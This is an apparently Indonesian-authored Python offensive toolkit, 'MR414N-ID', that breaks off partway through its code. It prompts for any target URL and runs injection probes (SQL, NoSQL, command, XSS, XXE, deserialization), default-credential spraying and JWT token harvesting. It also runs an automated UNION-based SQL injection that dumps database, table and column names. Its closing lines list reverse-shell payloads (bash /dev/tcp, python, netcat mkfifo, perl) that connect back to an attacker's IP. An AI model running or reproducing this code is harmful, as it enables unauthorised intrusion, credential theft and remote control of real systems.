#!/usr/bin/env python3
# lang: Python3, file: mr414n_v4.py, target: Linux/Termux
# install: pip install requests colorama

import sys, time, socket, threading, subprocess
import json, datetime, re, base64, os, shutil
import requests
from colorama import init
init(autoreset=True)
import urllib3
urllib3.disable_warnings()

# ══════════════════════════════════════════
#  COLOR & FONT SYSTEM
# ══════════════════════════════════════════

C = {
    "r": "\033[91m", "g": "\033[92m", "y": "\033[93m", "b": "\033[94m",
    "m": "\033[95m", "c": "\033[96m", "w": "\033[97m", "d": "\033[90m",
    "x": "\033[0m",  "B": "\033[1m",
}

FONT = {
    "M": ["#   #", "## ##", "# # #", "#   #", "#   #"],
    "R": ["#### ", "#   #", "#### ", "#  # ", "#   #"],
    "4": ["#  # ", "#  # ", "#####", "   # ", "   # "],
    "1": ["  #  ", " ##  ", "  #  ", "  #  ", " ### "],
    "N": ["#   #", "##  #", "# # #", "#  ##", "#   #"],
    "-": ["     ", "     ", " ### ", "     ", "     "],
    "I": ["###", " # ", " # ", " # ", "###"],
    "D": ["#### ", "#   #", "#   #", "#   #", "#### "],
}

TUX = [
    "      .--.      ",
    "     |o_o |     ",
    "     |:_/ |     ",
    "    //   \\ \\    ",
    "   (|     | )   ",
    "  /'\\_   _/`\\   ",
    "  \\___)=(___/   ",
]

RESULTS    = {}
TARGET_URL = ""
JWT_TOKENS = []   # global JWT collector — diisi otomatis tiap request

JWT_REGEX = re.compile(
    r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
)

def store(method, data):
    RESULTS[method] = data

def _harvest_jwt(r):
    """Scan response object untuk JWT — header, cookie, body."""
    found = set()
    # header
    for hval in r.headers.values():
        for m in JWT_REGEX.findall(hval):
            found.add(m)
    # cookie
    for ck in r.cookies:
        for m in JWT_REGEX.findall(ck.value):
            found.add(m)
    # body (limit 50kb biar tidak lambat)
    for m in JWT_REGEX.findall(r.text[:51200]):
        found.add(m)
    for tok in found:
        if tok not in JWT_TOKENS:
            JWT_TOKENS.append(tok)
            hit(f"[JWT HUNTER] Token ditemukan → {tok[:40]}...")

def req_get(url, **kw):
    r = requests.get(url, **kw)
    _harvest_jwt(r)
    return r

def req_post(url, **kw):
    r = requests.post(url, **kw)
    _harvest_jwt(r)
    return r

def blok(teks):
    baris = [""] * 5
    for ch in teks:
        if ch not in FONT:
            continue
        for i in range(5):
            baris[i] += FONT[ch][i].replace("#", "█") + " "
    return baris

def banner():
    os.system("clear")
    cols = shutil.get_terminal_size((50, 20)).columns
    print()
    for line in TUX:
        print(C["y"] + C["B"] + line.center(cols) + C["x"])
        time.sleep(0.05)
    print()
    teks = "MR414N-ID"
    needed = sum(len(FONT.get(c, ["     "])[0]) + 1 for c in teks)
    groups = ["MR414N-ID"] if needed <= cols else ["MR414N", "-ID"]
    warna  = ["r", "y", "g", "c", "m"]
    for t in groups:
        for i, row in enumerate(blok(t)):
            print(C[warna[i % len(warna)]] + C["B"] + row.center(cols) + C["x"])
            time.sleep(0.05)
    print()
    info_lines = [
        ("Author  ", "MR414N-ID"),
        ("Version ", "v6 — OWASP Full + 50 Metode"),
        ("Mode    ", "Recon → Probe → Strike → Report"),
    ]
    for k, v in info_lines:
        print(C["m"] + f"  {k}: " + C["w"] + v + C["x"])
    print()

def menu():
    print(C["g"] + C["B"] + "  ┌─[ PILIH METODE ]────────────────────────────────┐")
    opts = [
        ("1",  "Header Inspector     ", "HTTP headers & security flags"),
        ("2",  "DNS Lookup           ", "Semua record DNS"),
        ("3",  "Port Scanner         ", "Port umum web server"),
        ("4",  "WHOIS Grab           ", "Info registrar & IP"),
        ("5",  "Dir Brute-Force      ", "Path & file tersembunyi"),
        ("6",  "Tech Fingerprint     ", "CMS / framework / server"),
        ("7",  "SQL Inject Probe     ", "SQLi — error & blind"),
        ("8",  "NoSQL Inject Probe   ", "MongoDB / NoSQL injection"),
        ("9",  "Command Inject Probe ", "OS command injection"),
        ("10", "XSS Probe            ", "Reflected + DOM XSS"),
        ("11", "XXE Probe            ", "XML External Entity"),
        ("12", "Broken Auth          ", "Default creds + cookie flags"),
        ("13", "Sensitive Data Scan  ", "File sensitif + HTTPS check"),
        ("14", "Broken Access Ctrl   ", "IDOR + method bypass"),
        ("15", "Security Misconfig   ", "Headers + verbose error"),
        ("16", "Insecure Deserial    ", "Serialized payload probe"),
        ("17", "Known Vuln Check     ", "Versi → CVE match"),
        ("18", "Subdomain Enum       ", "Subdomain aktif"),
        ("19", "SQLi Auto-Exploit    ", "UNION dump tabel & kolom"),
        ("20", "Reverse Shell Drop   ", "CMDi → shell via netcat/bash"),
        ("21", "Credential Spray     ", "Wordlist + header rotation"),
        ("22", "LFI Probe            ", "Path traversal + filter bypass"),
        ("23", "Open Redirect Scan   ", "Parameter redirect hijack"),
        ("24", "SSRF Probe           ", "Internal fetch + meta-data"),
        ("25", "File Upload Bypass   ", "Webshell upload + ekstensi bypass"),
        ("26", "SSTI Probe           ", "Template injection → RCE"),
        ("27", "HTTP Smuggling       ", "CL.TE / TE.CL desync"),
        ("28", "CORS Misconfig       ", "Origin reflection + credentials"),
        ("29", "Webshell Manager     ", "Interactive shell via webshell"),
        ("30", "JWT Attack           ", "alg:none + weak secret + kid SQLi"),
        ("31", "GraphQL Introspect   ", "Schema dump + mutation probe"),
        ("32", "Prototype Pollution  ", "__proto__ / constructor injection"),
        ("33", "Google Dork          ", "Dork automation + DDG scrape"),
        ("34", "Wayback Scraper      ", "URL historis + filter interesting"),
        ("35", "JS File Analyzer     ", "Secret + endpoint + API key hunt"),
        ("36", "XML Injection        ", "Struktur XML manipulation"),
        ("37", "CRLF Injection       ", "Response splitting + cache poison"),
        ("38", "Host Header Inject   ", "Password reset poison + SSRF"),
        ("39", "CSS Injection        ", "Data exfil via CSS selector"),
        ("40", "WebSocket Hijack     ", "CSRF + command inject via WS"),
        ("41", "Email Harvester      ", "Kumpulkan email dari halaman+WHOIS"),
        ("42", "Parameter Discovery  ", "Fuzz parameter tersembunyi"),
        ("43", "API Endpoint Brute   ", "Scan /api/v1-v3/ endpoint"),
        ("44", "Tech CVE Auto-Match  ", "Stack → NVD CVE lookup otomatis"),
        ("45", "Metadata Extractor   ", "PDF/DOCX author + internal path"),
        ("46", "Data Exfiltrator     ", "Shell → dump passwd/env/creds"),
        ("47", "PrivEsc Checker      ", "SUID + sudo + cron + capabilities"),
        ("48", "Lateral Movement     ", "Ping sweep + port scan internal"),
        ("49", "Subdomain Takeover   ", "CNAME dangling → klaim subdomain"),
        ("50", "Cookie Manipulation  ", "Decode + flip + forge + crack"),
        ("A",  "ALL — Full OWASP     ", "Semua metode sekaligus"),
    ]
    for code, name, desc in opts:
        print(C["g"] + "  │ " + C["y"] + f"[{code:>2}]" +
              C["w"] + f" {name}" + C["c"] + f"→ {desc}")
    print(C["g"] + C["B"] + "  └──────────────────────────────────────────────────┘")
    print()

def section(title):
    print(C["c"] + C["B"] + f"\n  ─── {title} " + "─" * max(1, 42 - len(title)))

def hit(msg):  print(C["g"] + f"  [+] {msg}" + C["x"])
def miss(msg): print(C["r"] + f"  [-] {msg}" + C["x"])
def info(msg): print(C["y"] + f"  [*] {msg}" + C["x"])
def warn(msg): print(C["r"] + C["B"] + f"  [⚠] {msg}" + C["x"])

def get_target(method_name):
    global TARGET_URL
    section(method_name)
    url = input(C["w"] + "  Masukkan URL target » ").strip()
    if not url.startswith("http"):
        url = "https://" + url
    TARGET_URL = url
    return url

def get_domain(url):
    return url.replace("https://","").replace("http://","").split("/")[0]

HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) "
                         "AppleWebKit/537.36 Chrome/120.0"}

# ══════════════════════════════════════════
#  METODE LAMA (1-18)
# ══════════════════════════════════════════

def header_inspector(url):
    info("Fetching headers...")
    data = {"url": url, "headers": {}, "status": None, "final_url": None, "success": False}
    try:
        r = req_get(url, timeout=10, verify=False, headers=HEADERS)
        data["headers"]   = dict(r.headers)
        data["status"]    = r.status_code
        data["final_url"] = r.url
        data["success"]   = True
        for k, v in r.headers.items():
            print(C["g"] + f"  {k}: " + C["w"] + v)
        print(C["c"] + f"\n  Status : {r.status_code}")
        print(C["c"] + f"  URL    : {r.url}")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Header Inspector", data)

def dns_lookup(url):
    domain = get_domain(url)
    info(f"DNS Lookup → {domain}")
    data = {"domain": domain, "records": {}, "success": False}
    for rt in ["A","AAAA","MX","NS","TXT","CNAME"]:
        try:
            res = subprocess.run(["dig","+short",rt,domain],
                                 capture_output=True, text=True, timeout=5)
            out = res.stdout.strip()
            if out:
                data["records"][rt] = out.splitlines()
                data["success"] = True
                hit(f"[{rt}] {out}")
        except Exception:
            data["records"][rt] = []
    store("DNS Lookup", data)

def port_scanner(url):
    domain = get_domain(url)
    info(f"Port Scan → {domain}")
    ports = [21,22,23,25,53,80,443,8080,8443,3306,5432,6379,27017]
    data  = {"domain": domain, "open": [], "closed": [], "success": False}
    lock  = threading.Lock()
    def check(p):
        try:
            s = socket.socket(); s.settimeout(1)
            s.connect((domain, p)); s.close()
            with lock:
                data["open"].append(p); data["success"] = True
                hit(f"OPEN  :{p}")
        except:
            with lock:
                data["closed"].append(p)
    threads = [threading.Thread(target=check, args=(p,)) for p in ports]
    for t in threads: t.start()
    for t in threads: t.join()
    store("Port Scanner", data)

def whois_grab(url):
    domain = get_domain(url)
    info(f"WHOIS → {domain}")
    data = {"domain": domain, "info": [], "success": False}
    try:
        res = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=10)
        keys = ["registrar","creation","expiry","name server","registrant","country","dnssec"]
        lines = [l for l in res.stdout.splitlines()
                 if any(k in l.lower() for k in keys)]
        for l in lines:
            hit(l.strip()); data["info"].append(l.strip())
        if lines: data["success"] = True
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("WHOIS Grab", data)

WORDLIST = [
    "admin","login","wp-admin","dashboard","config","backup","test","api","upload",
    "shell","phpinfo","robots.txt",".env",".git","wp-config.php","setup","install",
    "debug","phpmyadmin","adminer","console","manager","panel","xmlrpc.php",
    "readme.html","license.txt","server-status",
]

def dir_bruteforce(url):
    info(f"Dir Brute → {url}")
    data = {"url": url, "found": [], "checked": len(WORDLIST), "success": False}
    for path in WORDLIST:
        target = f"{url.rstrip('/')}/{path}"
        try:
            r = req_get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200,301,302,403]:
                hit(f"{r.status_code} → {target}")
                data["found"].append({"path": target, "status": r.status_code})
            else:
                miss(f"{r.status_code} → {target}")
        except:
            pass
    if data["found"]: data["success"] = True
    store("Dir Brute-Force", data)

def tech_fingerprint(url):
    info(f"Tech Fingerprint → {url}")
    data = {"url": url, "detected": [], "server": "", "powered_by": "", "success": False}
    try:
        r    = req_get(url, timeout=10, verify=False, headers=HEADERS)
        h    = r.headers
        body = r.text.lower()
        checks = {
            "WordPress" : "wp-content" in body or "wp-includes" in body,
            "Joomla"    : "joomla" in body,
            "Drupal"    : "drupal" in body,
            "Laravel"   : "laravel" in body,
            "Django"    : "csrfmiddlewaretoken" in body,
            "React"     : "react" in body or "__react" in body,
            "PHP"       : "php" in h.get("x-powered-by","").lower(),
            "Nginx"     : "nginx" in h.get("server","").lower(),
            "Apache"    : "apache" in h.get("server","").lower(),
            "Cloudflare": "cf-ray" in h,
            "ASP.NET"   : "asp.net" in h.get("x-powered-by","").lower(),
        }
        for tech, detected in checks.items():
            if detected:
                hit(tech); data["detected"].append(tech)
        data["server"]     = h.get("server","unknown")
        data["powered_by"] = h.get("x-powered-by","unknown")
        if data["detected"]: data["success"] = True
        print(C["c"] + f"\n  Server       : {data['server']}")
        print(C["c"] + f"  X-Powered-By : {data['powered_by']}")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Tech Fingerprint", data)

def subdomain_enum(url):
    domain = get_domain(url)
    info(f"Subdomain Enum → {domain}")
    data = {"domain": domain, "live": [], "success": False}
    lock = threading.Lock()
    subs = [
        "www","mail","ftp","admin","dev","api","test","staging","portal","vpn",
        "remote","login","cpanel","webmail","shop","blog","cdn","static","assets",
        "media","beta","old","backup","secure","app","mobile","m",
    ]
    def check(sub):
        host = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(host)
            with lock:
                hit(f"{host} → {ip}")
                data["live"].append({"host": host, "ip": ip})
                data["success"] = True
        except:
            pass
    threads = [threading.Thread(target=check, args=(s,)) for s in subs]
    for t in threads: t.start()
    for t in threads: t.join()
    store("Subdomain Enum", data)

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--",
    '" OR ""="', "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1 AND SLEEP(3)--", "1' AND SLEEP(3)--", "1; DROP TABLE users--",
]
SQL_ERRORS = ["sql","mysql","syntax","error","warning","ora-","pg_query",
              "sqlite","mssql","unclosed quotation","microsoft ole db"]

def sqli_probe(url):
    info(f"SQLi Probe → {url}")
    data = {"url": url, "vulnerable": [], "blind": [], "tested": len(SQLI_PAYLOADS), "success": False}
    for pl in SQLI_PAYLOADS:
        target = f"{url}?id={requests.utils.quote(pl)}"
        try:
            t0      = time.time()
            r       = req_get(target, timeout=8, verify=False, headers=HEADERS)
            elapsed = time.time() - t0
            if any(e in r.text.lower() for e in SQL_ERRORS):
                warn(f"ERROR-BASED VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            elif elapsed > 2.5 and "SLEEP" in pl.upper():
                warn(f"TIME-BASED BLIND → {pl} ({elapsed:.1f}s)")
                data["blind"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl}")
        except:
            pass
    store("SQL Inject Probe", data)

NOSQL_PAYLOADS = [
    '{"$gt": ""}', '{"$ne": null}',
    '{"$where": "sleep(1000)"}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]

def nosql_probe(url):
    info(f"NoSQL Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": len(NOSQL_PAYLOADS), "success": False}
    for pl in NOSQL_PAYLOADS:
        try:
            r = req_post(url, json=json.loads(pl), timeout=6, verify=False, headers=HEADERS)
            if r.status_code in [200,302] and len(r.text) > 100:
                warn(f"POSSIBLE NOSQL VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl[:40]}")
        except Exception as e:
            miss(f"error → {e}")
    store("NoSQL Inject Probe", data)

CMD_PAYLOADS = [
    "; ls", "| ls", "`ls`", "$(ls)", "; id", "| id", "`id`", "$(id)",
    "; cat /etc/passwd", "| cat /etc/passwd", "; sleep 3", "| sleep 3",
    "&& whoami", "|| whoami",
]
CMD_SIGNS = ["root:","bin:","daemon:","uid=","www-data","total ","drwx","rwxr"]

def cmdi_probe(url):
    info(f"Command Injection Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": len(CMD_PAYLOADS), "success": False}
    for pl in CMD_PAYLOADS:
        target = f"{url}?cmd={requests.utils.quote(pl)}"
        try:
            t0      = time.time()
            r       = req_get(target, timeout=8, verify=False, headers=HEADERS)
            elapsed = time.time() - t0
            if any(s in r.text for s in CMD_SIGNS):
                warn(f"CMDI VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            elif elapsed > 2.5 and "sleep" in pl.lower():
                warn(f"BLIND CMDI (time) → {pl} ({elapsed:.1f}s)")
                data["vulnerable"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl}")
        except:
            pass
    store("Command Inject Probe", data)

XSS_PAYLOADS = [
    "<script>alert(1)</script>", '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "<body onload=alert(1)>", "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>", '"><svg/onload=alert(1)>',
    "'-alert(1)-'", "<script>document.write(document.cookie)</script>",
]

def xss_probe(url):
    info(f"XSS Probe → {url}")
    data = {"url": url, "reflected": [], "tested": len(XSS_PAYLOADS), "success": False}
    for pl in XSS_PAYLOADS:
        target = f"{url}?q={requests.utils.quote(pl)}"
        try:
            r = req_get(target, timeout=5, verify=False, headers=HEADERS)
            if pl.lower() in r.text.lower():
                warn(f"REFLECTED XSS → {pl[:60]}")
                data["reflected"].append(pl); data["success"] = True
            else:
                miss(f"not reflected → {pl[:50]}")
        except:
            pass
    store("XSS Probe", data)

XXE_PAYLOADS = [
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n<root>&xxe;</root>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<root>&xxe;</root>',
]
XXE_SIGNS = ["root:","bin:","daemon:","hostname","ami-id","instance-id"]

def xxe_probe(url):
    info(f"XXE Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": len(XXE_PAYLOADS), "success": False}
    xml_headers = {**HEADERS, "Content-Type": "application/xml"}
    for pl in XXE_PAYLOADS:
        try:
            r = req_post(url, data=pl, timeout=8, verify=False, headers=xml_headers)
            if any(s in r.text for s in XXE_SIGNS):
                warn("XXE VULN DETECTED")
                data["vulnerable"].append(pl[:80]); data["success"] = True
            else:
                miss("no XXE response")
        except Exception as e:
            miss(str(e))
    store("XXE Probe", data)

DEFAULT_CREDS = [
    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin",""),
    ("root","root"), ("root","toor"), ("test","test"), ("user","user"),
    ("guest","guest"), ("administrator","administrator"),
]
LOGIN_PATHS = ["/login","/admin","/wp-login.php","/administrator",
               "/user/login","/auth/login","/signin","/panel"]

def broken_auth(url):
    info(f"Broken Auth → {url}")
    data = {"url": url, "weak_creds": [], "cookie_issues": [], "login_found": [], "success": False}
    try:
        r = req_get(url, timeout=8, verify=False, headers=HEADERS)
        for ck in r.cookies:
            issues = []
            if not ck.secure: issues.append("no Secure flag")
            if not ck.has_nonstandard_attr("HttpOnly"): issues.append("no HttpOnly flag")
            if issues:
                warn(f"Cookie '{ck.name}': {', '.join(issues)}")
                data["cookie_issues"].append({"cookie": ck.name, "issues": issues})
                data["success"] = True
            else:
                hit(f"Cookie '{ck.name}': flags OK")
    except Exception as e:
        miss(str(e))
    for path in LOGIN_PATHS:
        target = url.rstrip("/") + path
        try:
            r = req_get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200,302]:
                hit(f"Login page found → {target}")
                data["login_found"].append(target)
                for usr, pwd in DEFAULT_CREDS:
                    try:
                        rp = req_post(
                            target,
                            data={"username": usr, "password": pwd,
                                  "user": usr, "pass": pwd, "email": usr},
                            timeout=5, verify=False, headers=HEADERS, allow_redirects=True)
                        fail_signs = ["invalid","incorrect","wrong","failed","error","login"]
                        if rp.status_code in [200,302] and not any(
                                s in rp.text.lower() for s in fail_signs):
                            warn(f"WEAK CREDS → {usr}:{pwd} @ {target}")
                            data["weak_creds"].append({"url": target, "user": usr, "pass": pwd})
                            data["success"] = True
                        else:
                            miss(f"failed → {usr}:{pwd}")
                    except:
                        pass
        except:
            pass
    store("Broken Auth", data)

SENSITIVE_PATHS = [
    ".env",".env.backup",".env.local","config.php","config.yml","config.json",
    "database.yml","settings.py","wp-config.php","backup.sql","dump.sql","db.sql",
    ".git/config",".git/HEAD","id_rsa","id_dsa","private.key","server.key",
    "ssl.key","cert.pem","phpinfo.php","info.php","test.php","error_log",
    "access.log","debug.log","composer.json","package.json","Dockerfile",
    "docker-compose.yml",".htpasswd",".bash_history",
]

def sensitive_data_scan(url):
    info(f"Sensitive Data Scan → {url}")
    data = {"url": url, "exposed": [], "https": False, "success": False}
    data["https"] = url.startswith("https://")
    if not data["https"]:
        warn("HTTP saja — data tidak terenkripsi")
        data["success"] = True
    for path in SENSITIVE_PATHS:
        target = f"{url.rstrip('/')}/{path}"
        try:
            r = req_get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code == 200 and len(r.text) > 10:
                warn(f"EXPOSED → {target}")
                data["exposed"].append({"path": target, "status": r.status_code, "size": len(r.text)})
                data["success"] = True
            else:
                miss(f"{r.status_code} → {path}")
        except:
            pass
    store("Sensitive Data Scan", data)

ADMIN_PATHS = [
    "/admin","/admin/","/admin/dashboard","/manager","/superuser","/root",
    "/api/admin","/api/users","/api/config","/user/1","/user/2",
    "/user/admin","/account/1","/account/2",
]
HTTP_METHODS = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","TRACE"]

def broken_access_ctrl(url):
    info(f"Broken Access Control → {url}")
    data = {"url": url, "idor": [], "method_bypass": [], "open_admin": [], "success": False}
    for path in ADMIN_PATHS:
        target = url.rstrip("/") + path
        try:
            r = req_get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200,302]:
                warn(f"OPEN without auth → {target}")
                data["open_admin"].append({"path": target, "status": r.status_code})
                data["success"] = True
            else:
                miss(f"{r.status_code} → {path}")
        except:
            pass
    for method in HTTP_METHODS:
        try:
            r = requests.request(method, url, timeout=5, verify=False, headers=HEADERS)
            if method not in ["GET","POST"] and r.status_code < 400:
                warn(f"METHOD ALLOWED → {method} ({r.status_code})")
                data["method_bypass"].append({"method": method, "status": r.status_code})
                data["success"] = True
            else:
                miss(f"{method} → {r.status_code}")
        except:
            pass
    store("Broken Access Control", data)

SEC_HEADERS_REQUIRED = [
    "strict-transport-security","x-content-type-options","x-frame-options",
    "content-security-policy","permissions-policy","referrer-policy","x-xss-protection",
]
VERBOSE_SIGNS = [
    "stack trace","traceback","exception","debug","fatal error","syntax error",
    "on line","at line","undefined variable","notice:","warning:","mysql_fetch","pg_query",
]

def security_misconfig(url):
    info(f"Security Misconfig → {url}")
    data = {"url": url, "missing_headers": [], "verbose_errors": False,
            "server_info": "", "open_methods": [], "success": False}
    try:
        r = req_get(url, timeout=10, verify=False, headers=HEADERS)
        h_lower = {k.lower(): v for k, v in r.headers.items()}
        for sh in SEC_HEADERS_REQUIRED:
            if sh not in h_lower:
                warn(f"MISSING → {sh}")
                data["missing_headers"].append(sh); data["success"] = True
            else:
                hit(f"Present → {sh}")
        srv = r.headers.get("server","")
        if srv and any(c.isdigit() for c in srv):
            warn(f"Server version exposed → {srv}"); data["success"] = True
        data["server_info"] = srv
        if any(s in r.text.lower() for s in VERBOSE_SIGNS):
            warn("Verbose error/debug info detected")
            data["verbose_errors"] = True; data["success"] = True
        ro    = requests.options(url, timeout=5, verify=False, headers=HEADERS)
        allow = ro.headers.get("Allow","")
        if allow:
            data["open_methods"] = allow.split(", ")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Security Misconfig", data)

DESER_PAYLOADS = {
    "PHP serialized"   : 'O:8:"stdClass":0:{}',
    "Java base64"      : base64.b64encode(b"\xac\xed\x00\x05sr\x00\x0bjava.lang.String").decode(),
    "Python pickle"    : base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
    "Ruby marshal"     : base64.b64encode(b"\x04\x08i\x00").decode(),
    "JSON type confuse": '{"__class__":"os","__reduce__":["system",["id"]]}',
}
DESER_SIGNS = [
    "unserialize","deserialization","java.io","pickle","marshal",
    "objectinputstream","classnotfoundexception","streamcorruptedexception","uid=","root:","bin:",
]

def insecure_deser(url):
    info(f"Insecure Deserialization → {url}")
    data = {"url": url, "vulnerable": [], "tested": len(DESER_PAYLOADS), "success": False}
    for name, payload in DESER_PAYLOADS.items():
        try:
            r = req_post(url, data=payload, timeout=6, verify=False,
                              headers={**HEADERS, "Content-Type": "application/octet-stream"})
            if any(s in r.text.lower() for s in DESER_SIGNS):
                warn(f"DESER SIGN → {name}")
                data["vulnerable"].append(name); data["success"] = True
            r2 = req_get(f"{url}?data={requests.utils.quote(payload)}",
                              timeout=6, verify=False, headers=HEADERS)
            if any(s in r2.text.lower() for s in DESER_SIGNS):
                warn(f"DESER SIGN (GET) → {name}")
                data["vulnerable"].append(f"{name} (GET)"); data["success"] = True
        except Exception as e:
            miss(str(e))
    store("Insecure Deserialization", data)

CVE_DB = {
    "wordpress 6.0" : "CVE-2022-3590 — reflected XSS",
    "wordpress 5.8" : "CVE-2021-39200 — info disclosure",
    "wordpress 5.6" : "CVE-2021-29447 — XXE via media upload",
    "joomla 3.9"    : "CVE-2019-10945 — path traversal",
    "joomla 4.0"    : "CVE-2023-23752 — improper access check",
    "drupal 9"      : "CVE-2022-25271 — remote code execution",
    "apache 2.4.49" : "CVE-2021-41773 — path traversal RCE",
    "apache 2.4.50" : "CVE-2021-42013 — path traversal bypass",
    "nginx 1.18"    : "CVE-2021-23017 — off-by-one in resolver",
    "php 8.0"       : "CVE-2022-31628 — stack overflow",
    "php 7.4"       : "CVE-2020-7071 — URL parsing bypass",
    "laravel 8"     : "CVE-2021-3129 — RCE via debug mode",
    "django 3.2"    : "CVE-2022-28347 — SQL injection",
}

def known_vuln_check(url):
    info(f"Known Vuln Check → {url}")
    data = {"url": url, "matches": [], "versions_found": [], "success": False}
    try:
        r    = req_get(url, timeout=10, verify=False, headers=HEADERS)
        body = r.text.lower()
        version_hints = []
        srv = r.headers.get("server","").lower()
        px  = r.headers.get("x-powered-by","").lower()
        if srv: version_hints.append(srv)
        if px:  version_hints.append(px)
        gen = re.findall(r'generator["\s]+content=["\s]+([^"]+)', body)
        version_hints.extend(gen)
        data["versions_found"] = version_hints
        for hint in version_hints:
            for key, cve in CVE_DB.items():
                if all(part in hint for part in key.split()):
                    warn(f"MATCH → {key} : {cve}")
                    data["matches"].append({"version": key, "cve": cve})
                    data["success"] = True
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Known Vuln Check", data)

# ══════════════════════════════════════════
#  METODE BARU (19-24)
# ══════════════════════════════════════════

# 19 — SQLi Auto-Exploit (UNION-based dump)
UNION_DETECT = [
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' ORDER BY 4--",
    "' ORDER BY 5--",
]

def sqli_autoexploit(url):
    info(f"SQLi Auto-Exploit → {url}")
    data = {"url": url, "columns": 0, "tables": [], "columns_dump": {}, "success": False}

    # langkah 1: hitung jumlah kolom via ORDER BY
    col_count = 0
    for i in range(1, 11):
        pl     = f"' ORDER BY {i}--"
        target = f"{url}?id={requests.utils.quote(pl)}"
        try:
            r = req_get(target, timeout=6, verify=False, headers=HEADERS)
            if any(e in r.text.lower() for e in ["unknown column","order by clause","1 order by"]):
                col_count = i - 1
                break
            col_count = i
        except:
            break

    if col_count == 0:
        miss("Tidak bisa deteksi jumlah kolom"); store("SQLi Auto-Exploit", data); return
    hit(f"Jumlah kolom terdeteksi: {col_count}")
    data["columns"] = col_count

    # langkah 2: cari kolom yang menampilkan output (string reflection)
    nulls    = ",".join(["NULL"] * col_count)
    vis_col  = None
    for i in range(1, col_count + 1):
        parts     = ["NULL"] * col_count
        parts[i-1] = "'MR414N_TEST'"
        pl     = f"' UNION SELECT {','.join(parts)}--"
        target = f"{url}?id=-1{requests.utils.quote(pl[1:])}"
        try:
            r = req_get(target, timeout=6, verify=False, headers=HEADERS)
            if "MR414N_TEST" in r.text:
                vis_col = i
                hit(f"Kolom visible untuk output: #{vis_col}")
                break
        except:
            pass

    if vis_col is None:
        miss("Tidak ada kolom yang visible"); store("SQLi Auto-Exploit", data); return

    def union_fetch(payload_val):
        parts     = ["NULL"] * col_count
        parts[vis_col-1] = payload_val
        pl     = f"' UNION SELECT {','.join(parts)}--"
        target = f"{url}?id=-1{requests.utils.quote(pl[1:])}"
        try:
            r   = req_get(target, timeout=8, verify=False, headers=HEADERS)
            raw = re.findall(r'MR414N\|(.*?)\|MR414N', r.text)
            return raw
        except:
            return []

    # langkah 3: dump nama database
    db_results = union_fetch("CONCAT('MR414N|',database(),'|MR414N')")
    if db_results:
        warn(f"Database: {db_results[0]}")
        data["database"] = db_results[0]

    # langkah 4: dump tabel
    tbl_results = union_fetch(
        "GROUP_CONCAT('MR414N|',table_name,'|MR414N' SEPARATOR '~') "
        "FROM information_schema.tables WHERE table_schema=database()")
    if tbl_results:
        tables = [t for t in tbl_results[0].split("~") if t]
        for t in tables:
            warn(f"Table → {t}")
            data["tables"].append(t)
        data["success"] = True

    # langkah 5: dump kolom dari tabel pertama
    if data["tables"]:
        first_tbl = data["tables"][0]
        col_results = union_fetch(
            f"GROUP_CONCAT('MR414N|',column_name,'|MR414N' SEPARATOR '~') "
            f"FROM information_schema.columns WHERE table_name='{first_tbl}'")
        if col_results:
            cols = [c for c in col_results[0].split("~") if c]
            data["columns_dump"][first_tbl] = cols
            for c in cols:
                hit(f"  [{first_tbl}] → {c}")

    store("SQLi Auto-Exploit", data)

# 20 — Reverse Shell Dropper via CMDi
SHELL_PAYLOADS = [
    # bash
    "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    # python3
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    # nc mkfifo
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    # perl
    "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
]
CMD_PARAMS = ["cmd","command","exec","run","ping","host","ip","q","query","input","shell"]

def reverse_shell_drop(url):
